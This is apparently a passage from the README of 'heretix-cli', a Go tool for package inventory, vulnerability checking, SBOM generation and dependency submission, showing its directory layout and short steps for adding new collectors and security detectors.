heretix-cli/
├── main.go                 # Entry point
├── cmd/                    # CLI command definitions (cobra)
├── collector/              # Package collection (Collector interface)
├── container/              # Docker image fetch & extraction
├── inventory/              # Package list JSON schema & I/O
├── checker/                # Vulnerability API client
├── detector/               # Local security checks (Detector interface)
├── report/                 # Table & JSON output
├── sbom/                   # CycloneDX SBOM generation
└── depgraph/               # GitHub Dependency Submission API client
```

## Extending

### New ecosystem collector

1. Add a `Collector` interface implementation under `collector/`
2. Register it in the list inside `CollectAll` in `collector/collect.go`

### New local security check

1. Add a `Detector` interface implementation under `detector/`
2. Register it in the list inside `RunAll` in `detector/detector.go`
